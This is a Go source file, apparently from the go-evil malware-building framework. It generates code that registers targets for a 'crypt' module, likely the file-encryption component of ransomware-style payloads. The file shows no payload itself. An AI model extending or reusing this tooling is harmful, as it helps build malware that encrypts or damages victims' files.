package target

import (
	"fmt"

	"github.com/s9rA16Bf4/go-evil/utility/structure/functions"
	"github.com/s9rA16Bf4/go-evil/utility/structure/json"
	"github.com/s9rA16Bf4/go-evil/utility/tools"
)

// Appends a target to focus on, you can also pass in a evil array with all your targets aswell
func Add(value string, data_object *json.Json_t) []string {

	function_call := "add_target"
	value = tools.Erase_delimiter(value, []string{"\""}, -1)

	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
		Parameters: []string{"repr_1 []int"},
		Gut: []string{
			"target := spine.variable.get(spine.alpha.construct_string(repr_1))",
			"if target != \"\"{",
			"spine.crypt.add_target(target)",
			"}",
		}})

	// Construct our int array
	parameter := data_object.Generate_int_array_parameter(value)

	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}
}
